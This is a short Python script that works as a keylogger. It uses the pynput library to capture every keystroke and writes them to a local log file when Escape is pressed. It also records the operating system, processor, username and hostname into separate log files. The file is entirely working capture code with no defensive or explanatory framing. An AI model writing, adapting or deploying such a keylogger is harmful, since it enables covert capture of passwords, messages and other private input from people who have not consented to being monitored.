import sys
import json
import time
import subprocess
import platform
from pynput.keyboard import Key, Listener
from datetime import datetime, time

count = 0
keys = []


def getSystemInfo():
    system_info = {}
    system_info["sys"] = platform.system()
    system_info["machine"] = platform.machine()
    system_info["version"] = platform.version()
    system_info["processor"] = platform.processor()
    return system_info

def getUserInfo():
    user_info = {}
    user_info["username"] = subprocess.run(["whoami"], stdout=subprocess.PIPE).stdout.decode().strip()
    user_info["hostname"] = subprocess.run(["hostname"], stdout=subprocess.PIPE).stdout.decode().strip()
    return user_info

def logTemplate(t):
    global count
    top_template = f"""[{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}]\n\n"""
    bottom_template = f"""<Word count = {count}>"""
    if t == "top":
        return top_template
    elif t == "bottom":
        return bottom_template

def dump(file_name, data, mode):
    if mode == "keys":
        with open(file_name, "a") as f:
            f.write(logTemplate("top"))
            for key in data:
                f.write(key)
    elif mode == "content":
        with open(file_name, "w") as f:
            f.write(data)
    else:
        raise Exception("InvalidModeException")

def on_press(key):
    global keys, count
    character = ""
    try:
        character = key.char
        # print(f"The key {key.char} was pressed")
    except AttributeError:
        if key == Key.space:
            character = " "
        elif key == Key.enter:
            character = "\n"
        elif key == Key.tab:
            character = "\t"
        # print(f"The special key {key} was pressed")
    count += 1
    keys.append(character)

def on_release(key):
    global keys
    if key == Key.esc:
        dump("log01.txt", data=keys, mode="keys")
        sys.exit(0)



if __name__ == "__main__":
    system_info = json.dumps(getSystemInfo(), indent=4)
    user_info = json.dumps(getUserInfo(), indent=4)
    dump("system.log", data=system_info, mode="content")
    dump("user.log", data=user_info, mode="content")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()